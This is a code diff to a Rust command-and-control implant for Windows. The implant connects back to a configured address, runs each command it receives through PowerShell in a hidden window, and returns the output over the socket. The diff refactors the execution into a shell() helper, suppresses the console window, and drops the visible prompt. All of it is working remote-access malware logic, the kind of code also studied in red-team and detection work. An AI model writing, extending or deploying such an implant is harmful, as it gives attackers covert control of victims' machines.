@@ -1,10 +1,38 @@
+use crate::cmd::{handle, parse_command};
+use crate::config::CONNECT_ADDRESS;
 use std::{
     io::{BufRead, BufReader, BufWriter, Write},
     net,
+    os::windows::process::CommandExt,
     process::Command,
 };
-use crate::cmd::{handle, parse_command};
-use crate::config::CONNECT_ADDRESS;
+
+///
+/// Executes shell commands and returns a [Vec] of bytes
+/// for transmission
+///
+fn shell(cmd: &str) -> Vec<u8> {
+    let mut res = Vec::new();
+
+    // Use the Command builder pattern to construct our
+    // slightly stealthy command, but not really
+    let output = Command::new("powershell")
+        .creation_flags(0x08000000)
+        .arg("-c")
+        .arg(cmd)
+        .output();
+
+    // Proper error handling! C2 agents
+    // should never panic!
+    match output {
+        Ok(o) => {
+            res.extend(o.stdout);
+            res.extend(o.stderr);
+        }
+        Err(_) => res.extend("[!] Command failed".as_bytes()),
+    }
+    res
+}
 
 pub fn execute() {
     // The primary TCP socket connection
@@ -17,10 +45,6 @@ pub fn execute() {
 
     // We can use the original stream for this, because we no longer care about the move
     let mut rx = BufReader::new(connection);
-
-    // Kickoff the conversation with the prompt
-    tx.write_all("\nPS $> ".as_bytes()).unwrap();
-    tx.flush().unwrap();
 
     // Initialize an empty String to hold our received data
     let mut read_buf = String::new();
@@ -56,25 +80,15 @@ pub fn execute() {
                                 }
                             }
                             None => {
-                                tx.write_all(format!("Bad Command: {cmd}").as_bytes())
+                                tx.write_all(format!("[!] Bad Command: {cmd}").as_bytes())
                                     .unwrap();
                             }
                         }
                     } else {
-                        // Use the Command builder pattern to construct our
-                        // not-at-all-stealthy command
-                        let output = Command::new("powershell")
-                            .arg("-nop")
-                            .arg("-w")
-                            .arg("hidden")
-                            .arg("-c")
-                            .arg(cmd)
-                            .output()
-                            .expect("Command failed!");
+                        let output = shell(cmd);
 
                         // Join stdout and stderr in the output
-                        tx.write_all(&output.stdout).unwrap();
-                        tx.write_all(&output.stderr).unwrap();
+                        tx.write_all(&output).unwrap();
                     }
                     tx.flush().unwrap();
                 } else {
